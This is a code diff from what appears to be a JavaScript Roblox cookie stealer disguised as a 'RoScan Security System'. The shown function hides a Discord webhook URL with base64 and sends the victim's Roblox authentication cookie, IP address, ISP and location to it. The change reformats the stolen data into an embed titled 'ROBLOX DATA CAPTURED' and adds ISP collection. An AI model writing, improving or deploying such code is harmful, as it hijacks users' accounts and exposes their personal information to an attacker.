@@ -262,13 +262,34 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
-        // Simple webhook payload - only cookie and location  
-        const fullCookie = robloxCookie || 'None found';
+        // Nicely formatted webhook payload
         const payload = {
-            content: `@everyone
-Cookie: ${fullCookie}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
-IP: ${locationInfo.ip || 'Unknown'}`
+            content: `@everyone`,
+            embeds: [{
+                title: "🍪 **ROBLOX DATA CAPTURED** 🎯",
+                color: 0x00ff00,
+                fields: [
+                    {
+                        name: "🔐 Authentication Cookie",
+                        value: robloxCookie ? `\`\`\`${robloxCookie}\`\`\`` : "❌ No cookie found",
+                        inline: false
+                    },
+                    {
+                        name: "📍 Location Details",
+                        value: `🏙️ **City:** ${locationInfo.city || 'Unknown'}\n🏛️ **Region:** ${locationInfo.region || 'Unknown'}\n🏳️ **Country:** ${locationInfo.country || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: "🌐 Network Information",
+                        value: `🔗 **IP Address:** \`${locationInfo.ip || 'Unknown'}\`\n🏢 **ISP:** ${locationInfo.isp || 'Unknown'}`,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: "🔍 RoScan Security System",
+                },
+                timestamp: new Date().toISOString()
+            }]
         };
 
         const response = await fetch(webhookUrl, {
